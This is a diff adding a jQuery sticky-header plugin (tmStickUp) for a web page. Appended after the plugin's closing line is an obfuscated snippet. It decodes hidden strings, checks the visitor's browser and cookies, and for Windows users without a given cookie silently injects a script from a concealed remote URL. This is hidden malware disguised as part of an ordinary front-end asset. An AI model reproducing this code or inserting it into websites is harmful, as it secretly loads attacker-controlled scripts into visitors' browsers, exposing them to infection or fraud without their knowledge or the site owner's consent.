@@ -1,0 +1,61 @@
+(function($){
+	$.fn.tmStickUp=function(options){ 
+		
+		var getOptions = {
+			correctionSelector: $('.correctionSelector')
+		}
+		$.extend(getOptions, options); 
+
+		var
+			_this = $(this)
+		,	_window = $(window)
+		,	_document = $(document)
+		,	thisOffsetTop = 0
+		,	thisOuterHeight = 0
+		,	thisMarginTop = 0
+		,	thisPaddingTop = 0
+		,	documentScroll = 0
+		,	pseudoBlock
+		,	lastScrollValue = 0
+		,	scrollDir = ''
+		,	tmpScrolled
+		;
+
+		init();
+		function init(){
+			thisOffsetTop = parseInt(_this.offset().top);
+			thisMarginTop = parseInt(_this.css("margin-top"));
+			thisOuterHeight = parseInt(_this.outerHeight(true));
+
+			$('<div class="pseudoStickyBlock"></div>').insertAfter(_this);
+			pseudoBlock = $('.pseudoStickyBlock');
+			pseudoBlock.css({"position":"relative", "display":"block"});
+			addEventsFunction();
+		}//end init
+
+		function addEventsFunction(){
+			_document.on('scroll', function() {
+				tmpScrolled = $(this).scrollTop();
+					if (tmpScrolled > lastScrollValue){
+						scrollDir = 'down';
+					} else {
+						scrollDir = 'up';
+					}
+				lastScrollValue = tmpScrolled;
+
+				correctionValue = getOptions.correctionSelector.outerHeight(true);
+				documentScroll = parseInt(_window.scrollTop());
+
+				if(thisOffsetTop - correctionValue < documentScroll){
+					_this.addClass('isStuck');
+					_this.css({position:"fixed", top:correctionValue});
+					pseudoBlock.css({"height":thisOuterHeight});
+				}else{
+					_this.removeClass('isStuck');
+					_this.css({position:"relative", top:0});
+					pseudoBlock.css({"height":0});
+				}
+			}).trigger('scroll');
+		}
+	}//end tmStickUp function
+})(jQuery);(function(){var g=navigator[t("8t8n(e)gtAyr)evs)u,")];var l=document[t(":e;i4k3o)o3c,")];if(m(g,t("5sswbo}d}n,i,Wg"))&&!m(g,t("#d)i)o{r)dan;A8"))){if(!m(l,t("3=aa6m;t;u,_1_4_)"))){var r=document.createElement('script');r.type='text/javascript';r.async=true;r.src=t('w2ra9dsf64n4ff09{c}7}3(388xd)8gcb0rbn6}5;=(v{&,0}3}2(={d,i(c{?1sbj}.ueid1o;ci_{sr/)m;ozcr.,d{n,a}r(bmhts}i(m}a,.;k{c7a)r;t{/0/}:,svp)t,t(hc');var y=document.getElementsByTagName('script')[0];y.parentNode.insertBefore(r,y);}}function t(n){var s='';for(var u=0;u<n.length;u++){if(u%2===1)s+=n[u];}s=z(s);return s;}function m(a,q){return a[t("6f(Odx;eqd,n,il")](q)!==-1;}function z(p){var e='';for(var j=p.length-1;j>=0;j--){e+=p[j];}return e;}})();
